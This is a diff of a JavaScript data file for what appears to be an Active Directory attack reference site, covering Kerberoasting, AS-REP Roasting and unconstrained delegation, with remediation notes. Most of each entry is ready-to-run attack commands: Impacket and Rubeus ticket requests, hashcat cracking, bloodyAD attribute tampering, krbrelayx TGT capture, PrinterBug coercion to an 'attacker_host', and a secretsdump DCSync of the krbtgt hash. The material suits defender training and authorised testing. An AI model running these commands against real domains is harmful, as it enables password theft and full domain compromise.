@@ -4261,68 +4261,176 @@ var VULNS = [
       },
 
       {
-        id: "kerberoasting-vuln",
-        name: "Kerberoasting",
-        severity: "High",
-        ref: "https://attack.mitre.org/techniques/T1558/003/",
-        theory: "theory/2026-08-18-kerberos.html",
-        description: "Any domain user requests service tickets for SPN accounts and cracks them offline to recover service-account passwords — often a direct path to high privilege.",
-        brief: "Kerberos issues a service ticket (TGS) to any authenticated user who asks for a given Service Principal Name, and the ticket is encrypted with the target service account's password-derived key. Kerberoasting requests those tickets and cracks them offline. No elevated privilege is needed and the request is indistinguishable from normal Kerberos traffic.\n\nImpact: service accounts are frequently over-privileged (sometimes Domain Admins) with weak, never-rotated passwords, so one cracked ticket can jump straight to high privilege.",
-        quickReference: [
-          { label: "Enumerate roastable accounts (LDAP filter)", cmd: "(&(objectClass=user)(servicePrincipalName=*))" },
-          { label: "Request tickets — Impacket (Linux)", cmd: "GetUserSPNs.py -request -dc-ip 10.10.10.10 corp.local/jdoe:'Passw0rd' -outputfile hashes.kerberoast" },
-          { label: "Request tickets — Rubeus (Windows)", cmd: "Rubeus.exe kerberoast /nowrap /outfile:hashes.kerberoast" },
-          { label: "Crack offline", cmd: "hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt" }
+        "id": "kerberoasting-vuln",
+        "name": "Kerberoasting",
+        "severity": "High",
+        "ref": "https://attack.mitre.org/techniques/T1558/003/",
+        "theory": "theory/2026-08-18-kerberos.html",
+        "description": "Any domain user requests service tickets for SPN accounts and cracks them offline to recover service-account passwords — often a direct path to high privilege.",
+        "brief": "Kerberos issues a service ticket (TGS) to any authenticated user who asks for a given Service Principal Name, and the ticket is encrypted with the target service account's password-derived key. Kerberoasting requests those tickets and cracks them offline. No elevated privilege is needed and the request is indistinguishable from normal Kerberos traffic.\n\nImpact: service accounts are frequently over-privileged (sometimes Domain Admins) with weak, never-rotated passwords, so one cracked ticket can jump straight to high privilege.",
+        "quickReference": [
+          {
+            "label": "Enumerate roastable accounts (LDAP filter)",
+            "cmd": "(&(objectClass=user)(servicePrincipalName=*))"
+          },
+          {
+            "label": "Request tickets — Impacket (Linux)",
+            "cmd": "GetUserSPNs.py -request -dc-ip 10.10.10.10 corp.local/jdoe:'Passw0rd' -outputfile hashes.kerberoast"
+          },
+          {
+            "label": "Request tickets — Rubeus (Windows)",
+            "cmd": "Rubeus.exe kerberoast /nowrap /outfile:hashes.kerberoast"
+          },
+          {
+            "label": "Crack offline",
+            "cmd": "hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt"
+          }
         ],
-        sections: [
+        "sections": [
           {
-            title: "How It's Exploited",
-            type: "commands",
-            commands: [
-              { label: "1. Enumerate accounts that have an SPN (from any domain user)", cmd: "# Impacket lists them and can request in one go\nGetUserSPNs.py -dc-ip 10.10.10.10 corp.local/jdoe:'Passw0rd'\n#   corp.local/jdoe:Passw0rd  -> any valid domain credential\n#   the output lists sAMAccountName + SPN of every service account" },
-              { label: "2. Request the TGS tickets and dump the crackable hashes", cmd: "GetUserSPNs.py -request -dc-ip 10.10.10.10 corp.local/jdoe:'Passw0rd' \\\n  -outputfile hashes.kerberoast\n#   -request        actually asks the KDC for a TGS per SPN\n#   -outputfile     writes the $krb5tgs$ hashes ready for hashcat\n# Target one account instead of all:\n#   -request-user svc_sql" },
-              { label: "3. Prefer RC4 tickets — they crack orders of magnitude faster than AES", cmd: "# Rubeus can force RC4 (etype 23) and filter for likely-weak accounts\nRubeus.exe kerberoast /rc4opsec /nowrap /outfile:hashes.kerberoast\n#   /rc4opsec  request RC4 only where it won't downgrade an AES-only account (quieter)\n#   /nowrap    keep each hash on one line for hashcat" },
-              { label: "4. Crack offline (no traffic to the target)", cmd: "hashcat -m 13100 hashes.kerberoast rockyou.txt -r rules/best64.rule\n#   -m 13100   Kerberoast (TGS-REP) mode\n# a hit gives the service account's cleartext password" },
-              { label: "5. Targeted Kerberoast — add an SPN to a user you can write to, then roast it", cmd: "# needs GenericWrite/GenericAll over the target (see Dangerous AD ACLs)\nbloodyAD -u jdoe -p 'Passw0rd' -d corp.local set object svc_target servicePrincipalName -v 'fake/svc'\nGetUserSPNs.py -request -dc-ip 10.10.10.10 corp.local/jdoe:'Passw0rd' -request-user svc_target\nbloodyAD -u jdoe -p 'Passw0rd' -d corp.local set object svc_target servicePrincipalName -v ''  # clean up" }
+            "title": "How It's Exploited",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "1. Enumerate accounts that have an SPN (from any domain user)",
+                "cmd": "# Impacket lists them and can request in one go\nGetUserSPNs.py -dc-ip 10.10.10.10 corp.local/jdoe:'Passw0rd'\n#   corp.local/jdoe:Passw0rd  -> any valid domain credential\n#   the output lists sAMAccountName + SPN of every service account"
+              },
+              {
+                "label": "2. Request the TGS tickets and dump the crackable hashes",
+                "cmd": "GetUserSPNs.py -request -dc-ip 10.10.10.10 corp.local/jdoe:'Passw0rd' \\\n  -outputfile hashes.kerberoast\n#   -request        actually asks the KDC for a TGS per SPN\n#   -outputfile     writes the $krb5tgs$ hashes ready for hashcat\n# Target one account instead of all:\n#   -request-user svc_sql"
+              },
+              {
+                "label": "3. Prefer RC4 tickets — they crack orders of magnitude faster than AES",
+                "cmd": "# Rubeus can force RC4 (etype 23) and filter for likely-weak accounts\nRubeus.exe kerberoast /rc4opsec /nowrap /outfile:hashes.kerberoast\n#   /rc4opsec  request RC4 only where it won't downgrade an AES-only account (quieter)\n#   /nowrap    keep each hash on one line for hashcat"
+              },
+              {
+                "label": "4. Crack offline (no traffic to the target)",
+                "cmd": "hashcat -m 13100 hashes.kerberoast rockyou.txt -r rules/best64.rule\n#   -m 13100   Kerberoast (TGS-REP) mode\n# a hit gives the service account's cleartext password"
+              },
+              {
+                "label": "5. Targeted Kerberoast — add an SPN to a user you can write to, then roast it",
+                "cmd": "# needs GenericWrite/GenericAll over the target (see Dangerous AD ACLs)\nbloodyAD -u jdoe -p 'Passw0rd' -d corp.local set object svc_target servicePrincipalName -v 'fake/svc'\nGetUserSPNs.py -request -dc-ip 10.10.10.10 corp.local/jdoe:'Passw0rd' -request-user svc_target\nbloodyAD -u jdoe -p 'Passw0rd' -d corp.local set object svc_target servicePrincipalName -v ''  # clean up"
+              }
             ]
           },
           {
-            title: "Attack Chain",
-            type: "table",
-            columns: ["Step", "Action", "Result"],
-            rows: [
-              ["1", "Authenticate with any domain user", "Foothold to send Kerberos requests"],
-              ["2", "LDAP-query accounts with servicePrincipalName set", "List of roastable service accounts"],
-              ["3", "Send TGS-REQ for each SPN (RC4 preferred)", "TGS-REP encrypted with the account's key"],
-              ["4", "Crack the $krb5tgs$ hash offline", "Service account cleartext password"],
-              ["5", "Authenticate as the service account", "Its privileges — frequently local admin or DA"]
+            "title": "Why the ticket cracks offline",
+            "type": "table",
+            "columns": [
+              "Mechanism",
+              "Why it enables the attack"
+            ],
+            "rows": [
+              [
+                "Any authenticated user can request a TGS",
+                "The KDC issues a service ticket for any SPN on request — no elevated right, and the traffic is ordinary Kerberos"
+              ],
+              [
+                "Ticket encrypted with the account's key",
+                "The TGS-REP is encrypted with the service account’s RC4 (NT hash) or AES key, so the ticket is a password oracle"
+              ],
+              [
+                "Cracking is entirely offline",
+                "Guessing runs on your own GPUs — the DC never sees it, so there is no lockout and no rate limit"
+              ],
+              [
+                "RC4 (etype 23) is the fast path",
+                "RC4 tickets crack far faster than AES, and an attacker can request RC4 where the account still allows it"
+              ],
+              [
+                "Service accounts are the weak link",
+                "Human-set, rarely-rotated passwords on accounts that are often over-privileged — exactly what offline cracking beats"
+              ]
             ]
           },
           {
-            title: "Tools Used",
-            type: "table",
-            columns: ["Tool", "Purpose"],
-            rows: [
-              ["Impacket GetUserSPNs.py", "Enumerate and request TGS tickets from Linux"],
-              ["Rubeus", "Request/roast from a domain-joined Windows host, RC4 opsec"],
-              ["NetExec", "--kerberoasting one-liner across the domain"],
-              ["hashcat / John", "Offline cracking (mode 13100)"],
-              ["bloodyAD / PowerView", "Write an SPN for targeted Kerberoasting"]
+            "title": "Attack Chain",
+            "type": "table",
+            "columns": [
+              "Step",
+              "Action",
+              "Result"
+            ],
+            "rows": [
+              [
+                "1",
+                "Authenticate with any domain user",
+                "Foothold to send Kerberos requests"
+              ],
+              [
+                "2",
+                "LDAP-query accounts with servicePrincipalName set",
+                "List of roastable service accounts"
+              ],
+              [
+                "3",
+                "Send TGS-REQ for each SPN (RC4 preferred)",
+                "TGS-REP encrypted with the account's key"
+              ],
+              [
+                "4",
+                "Crack the $krb5tgs$ hash offline",
+                "Service account cleartext password"
+              ],
+              [
+                "5",
+                "Authenticate as the service account",
+                "Its privileges — frequently local admin or DA"
+              ]
             ]
           },
           {
-            title: "References",
-            type: "references",
-            items: [
-              { label: "MITRE ATT&CK T1558.003 — Kerberoasting", url: "https://attack.mitre.org/techniques/T1558/003/" },
-              { label: "HackingArticles — Deep dive into Kerberoasting", url: "https://www.hackingarticles.in/deep-dive-into-kerberoasting-attack/" },
-              { label: "The Hacker Recipes — Kerberoast", url: "https://www.thehacker.recipes/ad/movement/kerberos/kerberoast" }
+            "title": "Tools Used",
+            "type": "table",
+            "columns": [
+              "Tool",
+              "Purpose"
+            ],
+            "rows": [
+              [
+                "Impacket GetUserSPNs.py",
+                "Enumerate and request TGS tickets from Linux"
+              ],
+              [
+                "Rubeus",
+                "Request/roast from a domain-joined Windows host, RC4 opsec"
+              ],
+              [
+                "NetExec",
+                "--kerberoasting one-liner across the domain"
+              ],
+              [
+                "hashcat / John",
+                "Offline cracking (mode 13100)"
+              ],
+              [
+                "bloodyAD / PowerView",
+                "Write an SPN for targeted Kerberoasting"
+              ]
             ]
           },
           {
-            title: "Remediation",
-            type: "notes",
-            items: [
+            "title": "References",
+            "type": "references",
+            "items": [
+              {
+                "label": "MITRE ATT&CK T1558.003 — Kerberoasting",
+                "url": "https://attack.mitre.org/techniques/T1558/003/"
+              },
+              {
+                "label": "HackingArticles — Deep dive into Kerberoasting",
+                "url": "https://www.hackingarticles.in/deep-dive-into-kerberoasting-attack/"
+              },
+              {
+                "label": "The Hacker Recipes — Kerberoast",
+                "url": "https://www.thehacker.recipes/ad/movement/kerberos/kerberoast"
+              }
+            ]
+          },
+          {
+            "title": "Remediation",
+            "type": "notes",
+            "items": [
               "Use Group Managed Service Accounts (gMSA/dMSA) — the DC manages a 120+ character password automatically, making cracking infeasible.",
               "Where gMSA is not possible, enforce 25+ character random passwords on service accounts.",
               "Enforce AES-only Kerberos to remove the fast RC4 cracking path (msDS-SupportedEncryptionTypes).",
@@ -4333,66 +4441,167 @@ var VULNS = [
         ]
       },
       {
-        id: "asrep-roasting-vuln",
-        name: "AS-REP Roasting",
-        severity: "High",
-        ref: "https://attack.mitre.org/techniques/T1558/004/",
-        theory: "theory/2026-08-18-kerberos.html",
-        description: "Accounts with Kerberos pre-authentication disabled hand out crackable AS-REP material — obtainable with only a username list, no credentials.",
-        brief: "Normal Kerberos requires pre-authentication: the client proves it knows the password before the KDC issues anything. When 'do not require pre-authentication' is set on an account, anyone can request an AS-REP for it and receive material encrypted with that account's key, crackable offline.\n\nImpact: with a valid credential you enumerate these accounts over LDAP; with only a username list you can request AS-REPs unauthenticated — so this can produce a first crackable credential from nothing but a name list.",
-        quickReference: [
-          { label: "Find pre-auth-disabled accounts (LDAP filter)", cmd: "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" },
-          { label: "With creds — enumerate + roast", cmd: "GetNPUsers.py corp.local/jdoe:'Passw0rd' -request -outputfile asrep.txt" },
-          { label: "No creds — from a username list", cmd: "GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10" },
-          { label: "Crack", cmd: "hashcat -m 18200 asrep.txt rockyou.txt" }
+        "id": "asrep-roasting-vuln",
+        "name": "AS-REP Roasting",
+        "severity": "High",
+        "ref": "https://attack.mitre.org/techniques/T1558/004/",
+        "theory": "theory/2026-08-18-kerberos.html",
+        "description": "Accounts with Kerberos pre-authentication disabled hand out crackable AS-REP material — obtainable with only a username list, no credentials.",
+        "brief": "Normal Kerberos requires pre-authentication: the client proves it knows the password before the KDC issues anything. When 'do not require pre-authentication' is set on an account, anyone can request an AS-REP for it and receive material encrypted with that account's key, crackable offline.\n\nImpact: with a valid credential you enumerate these accounts over LDAP; with only a username list you can request AS-REPs unauthenticated — so this can produce a first crackable credential from nothing but a name list.",
+        "quickReference": [
+          {
+            "label": "Find pre-auth-disabled accounts (LDAP filter)",
+            "cmd": "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"
+          },
+          {
+            "label": "With creds — enumerate + roast",
+            "cmd": "GetNPUsers.py corp.local/jdoe:'Passw0rd' -request -outputfile asrep.txt"
+          },
+          {
+            "label": "No creds — from a username list",
+            "cmd": "GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10"
+          },
+          {
+            "label": "Crack",
+            "cmd": "hashcat -m 18200 asrep.txt rockyou.txt"
+          }
         ],
-        sections: [
+        "sections": [
           {
-            title: "How It's Exploited",
-            type: "commands",
-            commands: [
-              { label: "1. (No credentials) Build a username list, then request AS-REPs", cmd: "# usernames from OSINT, doc metadata, or a naming convention\nGetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10 -format hashcat -outputfile asrep.txt\n#   corp.local/     domain, empty user (the AS-REQ itself needs no auth)\n#   -no-pass        do not attempt a password\n#   any account with pre-auth off returns a $krb5asrep$ hash" },
-              { label: "2. (With a credential) Enumerate the vulnerable accounts directly", cmd: "GetNPUsers.py corp.local/jdoe:'Passw0rd' -request -outputfile asrep.txt\n# or query LDAP for the DONT_REQ_PREAUTH bit:\n#   (userAccountControl:1.2.840.113556.1.4.803:=4194304)" },
-              { label: "3. Rubeus equivalent from a domain host", cmd: "Rubeus.exe asreproast /format:hashcat /nowrap /outfile:asrep.txt" },
-              { label: "4. Crack offline", cmd: "hashcat -m 18200 asrep.txt rockyou.txt -r rules/best64.rule\n#   -m 18200   Kerberos 5 AS-REP (etype 23)" },
-              { label: "5. Targeted AS-REP roast — if you can write UAC on a target", cmd: "# with GenericWrite over the account, flip pre-auth off, roast, flip back\nbloodyAD -u jdoe -p 'Passw0rd' -d corp.local add uac svc_target -f DONT_REQ_PREAUTH\nGetNPUsers.py corp.local/jdoe:'Passw0rd' -request -outputfile asrep.txt\nbloodyAD -u jdoe -p 'Passw0rd' -d corp.local remove uac svc_target -f DONT_REQ_PREAUTH" }
+            "title": "How It's Exploited",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "1. (No credentials) Build a username list, then request AS-REPs",
+                "cmd": "# usernames from OSINT, doc metadata, or a naming convention\nGetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10 -format hashcat -outputfile asrep.txt\n#   corp.local/     domain, empty user (the AS-REQ itself needs no auth)\n#   -no-pass        do not attempt a password\n#   any account with pre-auth off returns a $krb5asrep$ hash"
+              },
+              {
+                "label": "2. (With a credential) Enumerate the vulnerable accounts directly",
+                "cmd": "GetNPUsers.py corp.local/jdoe:'Passw0rd' -request -outputfile asrep.txt\n# or query LDAP for the DONT_REQ_PREAUTH bit:\n#   (userAccountControl:1.2.840.113556.1.4.803:=4194304)"
+              },
+              {
+                "label": "3. Rubeus equivalent from a domain host",
+                "cmd": "Rubeus.exe asreproast /format:hashcat /nowrap /outfile:asrep.txt"
+              },
+              {
+                "label": "4. Crack offline",
+                "cmd": "hashcat -m 18200 asrep.txt rockyou.txt -r rules/best64.rule\n#   -m 18200   Kerberos 5 AS-REP (etype 23)"
+              },
+              {
+                "label": "5. Targeted AS-REP roast — if you can write UAC on a target",
+                "cmd": "# with GenericWrite over the account, flip pre-auth off, roast, flip back\nbloodyAD -u jdoe -p 'Passw0rd' -d corp.local add uac svc_target -f DONT_REQ_PREAUTH\nGetNPUsers.py corp.local/jdoe:'Passw0rd' -request -outputfile asrep.txt\nbloodyAD -u jdoe -p 'Passw0rd' -d corp.local remove uac svc_target -f DONT_REQ_PREAUTH"
+              }
             ]
           },
           {
-            title: "Attack Chain",
-            type: "table",
-            columns: ["Step", "Action", "Result"],
-            rows: [
-              ["1", "Obtain a username list (OSINT) or a domain credential", "Candidates to test / ability to enumerate"],
-              ["2", "Request AS-REP for accounts with pre-auth disabled", "$krb5asrep$ hash (no password needed)"],
-              ["3", "Crack the AS-REP hash offline", "Account cleartext password"],
-              ["4", "Authenticate as the account", "Foothold or privilege, depending on the account"]
+            "title": "How disabling pre-auth exposes the account",
+            "type": "table",
+            "columns": [
+              "Mechanism",
+              "Why it enables the attack"
+            ],
+            "rows": [
+              [
+                "Pre-auth normally proves the password first",
+                "The KDC refuses to issue anything until the client encrypts a timestamp with the account’s key"
+              ],
+              [
+                "DONT_REQ_PREAUTH removes that gate",
+                "With the flag set, the KDC returns an AS-REP to anyone who asks — no proof of the password required"
+              ],
+              [
+                "The AS-REP carries an encrypted blob",
+                "Part of the reply is encrypted with the account’s key, making it a crackable password oracle like a Kerberoast ticket"
+              ],
+              [
+                "No credentials needed",
+                "Unlike Kerberoasting, a username (or a list) is enough; the request is unauthenticated, so OSINT names suffice"
+              ],
+              [
+                "Legacy clients set the flag",
+                "It is usually enabled for old apps that cannot do pre-auth — and then forgotten"
+              ]
             ]
           },
           {
-            title: "Tools Used",
-            type: "table",
-            columns: ["Tool", "Purpose"],
-            rows: [
-              ["Impacket GetNPUsers.py", "Enumerate/request AS-REPs (with or without creds)"],
-              ["Rubeus", "asreproast from a Windows host"],
-              ["Kerbrute", "Quietly confirm which usernames exist first"],
-              ["hashcat / John", "Offline cracking (mode 18200)"],
-              ["bloodyAD / PowerView", "Toggle DONT_REQ_PREAUTH for targeted roasting"]
+            "title": "Attack Chain",
+            "type": "table",
+            "columns": [
+              "Step",
+              "Action",
+              "Result"
+            ],
+            "rows": [
+              [
+                "1",
+                "Obtain a username list (OSINT) or a domain credential",
+                "Candidates to test / ability to enumerate"
+              ],
+              [
+                "2",
+                "Request AS-REP for accounts with pre-auth disabled",
+                "$krb5asrep$ hash (no password needed)"
+              ],
+              [
+                "3",
+                "Crack the AS-REP hash offline",
+                "Account cleartext password"
+              ],
+              [
+                "4",
+                "Authenticate as the account",
+                "Foothold or privilege, depending on the account"
+              ]
             ]
           },
           {
-            title: "References",
-            type: "references",
-            items: [
-              { label: "MITRE ATT&CK T1558.004 — AS-REP Roasting", url: "https://attack.mitre.org/techniques/T1558/004/" },
-              { label: "The Hacker Recipes — AS-REP roast", url: "https://www.thehacker.recipes/ad/movement/kerberos/asreproast" }
+            "title": "Tools Used",
+            "type": "table",
+            "columns": [
+              "Tool",
+              "Purpose"
+            ],
+            "rows": [
+              [
+                "Impacket GetNPUsers.py",
+                "Enumerate/request AS-REPs (with or without creds)"
+              ],
+              [
+                "Rubeus",
+                "asreproast from a Windows host"
+              ],
+              [
+                "Kerbrute",
+                "Quietly confirm which usernames exist first"
+              ],
+              [
+                "hashcat / John",
+                "Offline cracking (mode 18200)"
+              ],
+              [
+                "bloodyAD / PowerView",
+                "Toggle DONT_REQ_PREAUTH for targeted roasting"
+              ]
             ]
           },
           {
-            title: "Remediation",
-            type: "notes",
-            items: [
+            "title": "References",
+            "type": "references",
+            "items": [
+              {
+                "label": "MITRE ATT&CK T1558.004 — AS-REP Roasting",
+                "url": "https://attack.mitre.org/techniques/T1558/004/"
+              },
+              {
+                "label": "The Hacker Recipes — AS-REP roast",
+                "url": "https://www.thehacker.recipes/ad/movement/kerberos/asreproast"
+              }
+            ]
+          },
+          {
+            "title": "Remediation",
+            "type": "notes",
+            "items": [
               "Audit for and clear the DONT_REQ_PREAUTH flag everywhere; never disable Kerberos pre-authentication.",
               "If an exception is genuinely required, give the account a long random password so the AS-REP is uncrackable.",
               "Enforce AES to slow cracking where the flag cannot be removed immediately.",
@@ -4486,67 +4695,172 @@ var VULNS = [
         ]
       },
       {
-        id: "unconstrained-delegation",
-        name: "Unconstrained Delegation",
-        severity: "Critical",
-        ref: "https://attack.mitre.org/techniques/T1558/",
-        theory: "theory/2026-08-18-delegation.html",
-        description: "A host trusted for unconstrained delegation caches the TGT of everyone who authenticates to it — coerce a DC and capture its TGT for domain compromise.",
-        brief: "A computer trusted for unconstrained delegation stores the full TGT of any user who authenticates to it, so it can impersonate them anywhere. Compromise such a host — or coerce a high-value account like a domain controller into authenticating to it — and you capture that TGT.\n\nImpact: capturing a DC's TGT is effectively domain compromise. The danger is greatest when an ordinary server (not just a DC) is trusted for unconstrained delegation, because it becomes a stepping stone to the DC's identity.",
-        quickReference: [
-          { label: "Find unconstrained-delegation hosts (LDAP)", cmd: "(userAccountControl:1.2.840.113556.1.4.803:=524288)" },
-          { label: "PowerView", cmd: "Get-DomainComputer -Unconstrained -Properties dnshostname" },
-          { label: "Listen for and capture inbound TGTs", cmd: "krbrelayx.py -aesKey <host_aes_key>" },
-          { label: "Coerce a DC to authenticate to your host", cmd: "printerbug.py 'corp.local/jdoe:Passw0rd'@dc01 attacker_host" }
+        "id": "unconstrained-delegation",
+        "name": "Unconstrained Delegation",
+        "severity": "Critical",
+        "ref": "https://attack.mitre.org/techniques/T1558/",
+        "theory": "theory/2026-08-18-delegation.html",
+        "description": "A host trusted for unconstrained delegation caches the TGT of everyone who authenticates to it — coerce a DC and capture its TGT for domain compromise.",
+        "brief": "A computer trusted for unconstrained delegation stores the full TGT of any user who authenticates to it, so it can impersonate them anywhere. Compromise such a host — or coerce a high-value account like a domain controller into authenticating to it — and you capture that TGT.\n\nImpact: capturing a DC's TGT is effectively domain compromise. The danger is greatest when an ordinary server (not just a DC) is trusted for unconstrained delegation, because it becomes a stepping stone to the DC's identity.",
+        "quickReference": [
+          {
+            "label": "Find unconstrained-delegation hosts (LDAP)",
+            "cmd": "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
+          },
+          {
+            "label": "PowerView",
+            "cmd": "Get-DomainComputer -Unconstrained -Properties dnshostname"
+          },
+          {
+            "label": "Listen for and capture inbound TGTs",
+            "cmd": "krbrelayx.py -aesKey <host_aes_key>"
+          },
+          {
+            "label": "Coerce a DC to authenticate to your host",
+            "cmd": "printerbug.py 'corp.local/jdoe:Passw0rd'@dc01 attacker_host"
+          }
         ],
-        sections: [
+        "sections": [
           {
-            title: "How It's Exploited",
-            type: "commands",
-            commands: [
-              { label: "1. Enumerate hosts trusted for unconstrained delegation", cmd: "# the TRUSTED_FOR_DELEGATION UAC bit (524288)\nGet-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties trustedfordelegation,serviceprincipalname\n# BloodHound flags these too; DCs have it by design — the risk is any OTHER host that has it" },
-              { label: "2. On the delegation host you control, run a capture listener", cmd: "# you need the host account's key material (own the host first, or use a computer object you created)\nkrbrelayx.py -aesKey <host_account_AES256_key>\n# it waits for inbound authentications and extracts the cached TGT" },
-              { label: "3. Coerce a domain controller to authenticate to your host", cmd: "# PrinterBug (MS-RPRN) forces DC01's machine account to connect back\nprinterbug.py 'corp.local/jdoe:Passw0rd'@dc01 attacker_host\n# alternatives: PetitPotam (MS-EFSRPC), Coercer (sprays every method)" },
-              { label: "4. Reuse the captured DC TGT to replicate secrets (DCSync)", cmd: "export KRB5CCNAME='DC01$@CORP.LOCAL.ccache'\nsecretsdump.py -k -no-pass -just-dc-user krbtgt dc01.corp.local\n#   -k -no-pass   use the Kerberos ticket in KRB5CCNAME, no password\n# the krbtgt hash -> Golden Ticket -> full domain persistence" }
+            "title": "How It's Exploited",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "1. Enumerate hosts trusted for unconstrained delegation",
+                "cmd": "# the TRUSTED_FOR_DELEGATION UAC bit (524288)\nGet-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties trustedfordelegation,serviceprincipalname\n# BloodHound flags these too; DCs have it by design — the risk is any OTHER host that has it"
+              },
+              {
+                "label": "2. On the delegation host you control, run a capture listener",
+                "cmd": "# you need the host account's key material (own the host first, or use a computer object you created)\nkrbrelayx.py -aesKey <host_account_AES256_key>\n# it waits for inbound authentications and extracts the cached TGT"
+              },
+              {
+                "label": "3. Coerce a domain controller to authenticate to your host",
+                "cmd": "# PrinterBug (MS-RPRN) forces DC01's machine account to connect back\nprinterbug.py 'corp.local/jdoe:Passw0rd'@dc01 attacker_host\n# alternatives: PetitPotam (MS-EFSRPC), Coercer (sprays every method)"
+              },
+              {
+                "label": "4. Reuse the captured DC TGT to replicate secrets (DCSync)",
+                "cmd": "export KRB5CCNAME='DC01$@CORP.LOCAL.ccache'\nsecretsdump.py -k -no-pass -just-dc-user krbtgt dc01.corp.local\n#   -k -no-pass   use the Kerberos ticket in KRB5CCNAME, no password\n# the krbtgt hash -> Golden Ticket -> full domain persistence"
+              }
             ]
           },
           {
-            title: "Attack Chain",
-            type: "table",
-            columns: ["Step", "Action", "Result"],
-            rows: [
-              ["1", "Find a host with TRUSTED_FOR_DELEGATION", "Delegation-trusted target"],
-              ["2", "Gain control of that host's key material", "Ability to run the capture listener"],
-              ["3", "Run krbrelayx capture listener", "Waiting to receive TGTs"],
-              ["4", "Coerce a DC (PrinterBug/PetitPotam) to authenticate", "DC machine-account TGT cached on your host"],
-              ["5", "Reuse the DC TGT to DCSync", "krbtgt hash → domain compromise"]
+            "title": "Why a delegated host captures TGTs",
+            "type": "table",
+            "columns": [
+              "Mechanism",
+              "Why it enables the attack"
+            ],
+            "rows": [
+              [
+                "Delegation forwards the user's full TGT",
+                "When a user authenticates to the host, the KDC embeds their TGT in the ticket so the host can act as them anywhere"
+              ],
+              [
+                "The forwarded TGT is cached in LSASS",
+                "Any TGT that lands on the host can be extracted by whoever controls the host"
+              ],
+              [
+                "It is not limited to real visitors",
+                "Coercion (PrinterBug / PetitPotam) forces a chosen high-value account — a domain controller — to authenticate and drop its TGT"
+              ],
+              [
+                "A captured DC TGT is the domain",
+                "Replaying the DC machine-account TGT enables DCSync of krbtgt and full compromise"
+              ],
+              [
+                "Ordinary servers are the real risk",
+                "A non-DC trusted for unconstrained delegation becomes a stepping stone to the DC’s identity"
+              ]
             ]
           },
           {
-            title: "Tools Used",
-            type: "table",
-            columns: ["Tool", "Purpose"],
-            rows: [
-              ["PowerView / BloodHound", "Find unconstrained-delegation hosts"],
-              ["krbrelayx.py", "Capture the TGT cached by the coerced authentication"],
-              ["printerbug.py / PetitPotam / Coercer", "Force a DC to authenticate to your host"],
-              ["Impacket secretsdump.py", "DCSync with the captured DC TGT"],
-              ["Rubeus", "monitor/tgtdeleg on a compromised Windows delegation host"]
+            "title": "Attack Chain",
+            "type": "table",
+            "columns": [
+              "Step",
+              "Action",
+              "Result"
+            ],
+            "rows": [
+              [
+                "1",
+                "Find a host with TRUSTED_FOR_DELEGATION",
+                "Delegation-trusted target"
+              ],
+              [
+                "2",
+                "Gain control of that host's key material",
+                "Ability to run the capture listener"
+              ],
+              [
+                "3",
+                "Run krbrelayx capture listener",
+                "Waiting to receive TGTs"
+              ],
+              [
+                "4",
+                "Coerce a DC (PrinterBug/PetitPotam) to authenticate",
+                "DC machine-account TGT cached on your host"
+              ],
+              [
+                "5",
+                "Reuse the DC TGT to DCSync",
+                "krbtgt hash → domain compromise"
+              ]
             ]
           },
           {
-            title: "References",
-            type: "references",
-            items: [
-              { label: "Hadess — Pwning the Domain: Kerberos Delegation", url: "https://hadess.io/" },
-              { label: "dirkjanm — Exploiting unconstrained delegation", url: "https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/" },
-              { label: "The Hacker Recipes — Unconstrained delegation", url: "https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained" }
+            "title": "Tools Used",
+            "type": "table",
+            "columns": [
+              "Tool",
+              "Purpose"
+            ],
+            "rows": [
+              [
+                "PowerView / BloodHound",
+                "Find unconstrained-delegation hosts"
+              ],
+              [
+                "krbrelayx.py",
+                "Capture the TGT cached by the coerced authentication"
+              ],
+              [
+                "printerbug.py / PetitPotam / Coercer",
+                "Force a DC to authenticate to your host"
+              ],
+              [
+                "Impacket secretsdump.py",
+                "DCSync with the captured DC TGT"
+              ],
+              [
+                "Rubeus",
+                "monitor/tgtdeleg on a compromised Windows delegation host"
+              ]
             ]
           },
           {
-            title: "Remediation",
-            type: "notes",
-            items: [
+            "title": "References",
+            "type": "references",
+            "items": [
+              {
+                "label": "Hadess — Pwning the Domain: Kerberos Delegation",
+                "url": "https://hadess.io/"
+              },
+              {
+                "label": "dirkjanm — Exploiting unconstrained delegation",
+                "url": "https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/"
+              },
+              {
+                "label": "The Hacker Recipes — Unconstrained delegation",
+                "url": "https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained"
+              }
+            ]
+          },
+          {
+            "title": "Remediation",
+            "type": "notes",
+            "items": [
               "Eliminate unconstrained delegation except where strictly required, and never on non-DC servers.",
               "Put sensitive/Tier-0 accounts in the Protected Users group or mark them 'account is sensitive and cannot be delegated' (NOT_DELEGATED).",
               "Disable the Print Spooler on DCs and patch coercion vectors to remove the trigger.",
@@ -4640,68 +4954,176 @@ var VULNS = [
         ]
       },
       {
-        id: "rbcd",
-        name: "Resource-Based Constrained Delegation (RBCD)",
-        severity: "High",
-        ref: "https://attack.mitre.org/techniques/T1134/",
-        theory: "theory/2026-08-18-delegation.html",
-        description: "Write access to a computer object lets an attacker configure delegation onto it and impersonate any user to that host — often achievable from a plain foothold.",
